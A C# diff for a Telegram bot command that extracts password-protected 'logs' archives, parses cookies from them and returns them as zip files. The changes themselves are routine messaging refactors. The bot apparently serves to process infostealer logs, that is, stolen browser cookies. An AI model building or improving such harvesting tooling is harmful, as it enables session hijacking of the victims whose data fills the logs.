@@ -18,7 +18,7 @@ public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService d
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
 
-        await ProcessArchive(user, logsname, null);
+        await ProcessArchive(update.msg_id, user, logsname, null);
     }
 
     public bool AuthorizedOnly { get; } = true;
@@ -58,10 +58,10 @@ public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService d
             if (filepath is null) return;
         }
 
-        await ProcessArchive(user, filepath, GetPassword(((Message)update.message).message));
+        await ProcessArchive(update.message.ID, user, filepath, GetPassword(((Message)update.message).message));
     }
 
-    private async Task ProcessArchive(InputPeer peer, string logsname, string? password)
+    private async Task ProcessArchive(int messageId, InputPeer peer, string logsname, string? password)
     {
         if (data.GetLogsPath(logsname) is not { } zippath ||
             await data.ExtractFilesAsync(peer, zippath, password) is not { } dir)
@@ -71,12 +71,14 @@ public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService d
             if (!Directory.Exists(dir)) return;
         }
 
-        await ParseCookies(peer, logsname, dir);
+        await ParseCookies(messageId, peer, logsname, dir);
     }
 
-    private async Task ParseCookies(InputPeer peer, string filename, string dir)
+    private async Task ParseCookies(int messageId, InputPeer peer, string filename, string dir)
     {
-        await client.Messages_SendMessage(peer, $"Start parsing cookies from {filename}", Random.Shared.NextInt64());
+        var files = new List<InputFileBase>();
+        
+        await client.EditMessage(peer, messageId, $"Cookies\nStart parsing cookies from {filename}");
 
         foreach ((var cookie, var cookies) in cfgParse.Cookies.CookiesFromLogs(dir))
         {
@@ -87,10 +89,20 @@ public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService d
                 cookies.ToArray(),
                 "Cookies");
 
-            await data.SendFileAsync(peer, path);
+            files.Add(await client.UploadFileAsync(path));
         }
+        
+        await client.EditMessage(peer, messageId, $"Cookies\n{filename} successfully processed");
 
-        await client.Messages_SendMessage(peer, $"{filename} successfully processed", Random.Shared.NextInt64());
+        await client.Messages_SendMultiMedia(peer,
+            multi_media: files
+                .Select(x => new InputSingleMedia
+                {
+                    media = new InputMediaUploadedDocument(x, "application/zip"),
+                    random_id = Random.Shared.NextInt64()
+                })
+                .ToArray()
+            );
     }
 
     private string? GetPassword(string text)
